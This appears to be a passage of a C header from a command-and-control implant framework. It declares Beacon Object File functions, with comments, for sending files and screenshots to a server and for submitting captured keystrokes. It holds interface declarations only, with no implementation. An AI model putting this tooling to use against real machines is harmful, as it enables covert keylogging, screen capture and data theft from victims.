...
BEACON_IMPEX HANDLE BeaconGetStopJobEvent();

/* Vanta BOF functions */

// --- Download API ---
// Upload an in-memory buffer to the server under the given filename. Drives
// the chunked Download protocol via the active task and blocks the caller
// until the transfer finishes. Unlike BeaconScreenshot, `filename` is
// required — there is no auto-generated fallback.
// Returns 1 on success, 0 on failure (no active task / no context-switch
// available / null or empty filename / cancellation / transport error).
BEACON_IMPEX int BeaconDownload(const char* filename, const char* buffer, unsigned int length);

// --- Screenshot API ---
// Send pre-encoded screenshot bytes (PNG/JPEG/etc � the BOF chooses encoding)
// back to the server via the active task. The runtime drives the chunked
// upload protocol and blocks the caller until the transfer finishes.
// `filename` may be NULL � runtime auto-generates a name including host/user.
// Returns 1 on success, 0 on failure (no active task / no context-switch
// available / cancellation / transport error).
BEACON_IMPEX int BeaconScreenshot(const char* data, int len, const char* filename);

// --- Keylog API ---
// Submit a single keylog entry to be batched into the active task's response
// as part of the `keylogs` array. Multiple calls within the same cycle
// accumulate � they are flushed together on the next yield/output/completion.
// Any of the string args may be NULL (treated as empty).
// Returns 1 on success (entry queued), 0 on failure (no active task).
BEACON_IMPEX int BeaconKeylog(const char* user, const char* window_title, const char* key_presses);
